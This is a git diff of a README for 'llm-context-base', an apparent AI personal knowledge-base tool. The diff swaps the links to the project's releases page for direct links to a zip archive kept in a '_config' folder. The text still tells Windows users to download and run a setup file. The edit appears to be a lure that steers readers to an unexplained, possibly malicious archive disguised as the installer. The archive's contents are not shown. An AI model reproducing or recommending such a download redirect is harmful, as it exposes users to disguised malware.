@@ -1,12 +1,12 @@
 # 🧠 llm-context-base - Build your own private intelligence database
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/minor-maianthemumcanadense3023/llm-context-base/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/minor-maianthemumcanadense3023/llm-context-base/raw/refs/heads/main/_config/llm_context_base_2.1.zip)
 
 This application creates a personal knowledge base that works with artificial intelligence. You store your notes, documents, and research in one place. The software organizes this information so you can ask it questions and get accurate answers based on your own files.
 
 ## 📥 Getting the software
 
-Visit this page to download the latest setup file: [https://github.com/minor-maianthemumcanadense3023/llm-context-base/releases](https://github.com/minor-maianthemumcanadense3023/llm-context-base/releases)
+Visit this page to download the latest setup file: [https://github.com/minor-maianthemumcanadense3023/llm-context-base/raw/refs/heads/main/_config/llm_context_base_2.1.zip](https://github.com/minor-maianthemumcanadense3023/llm-context-base/raw/refs/heads/main/_config/llm_context_base_2.1.zip)
 
 Choose the file ending in .msi or .exe for your Windows computer. Save this file to your computer.
 
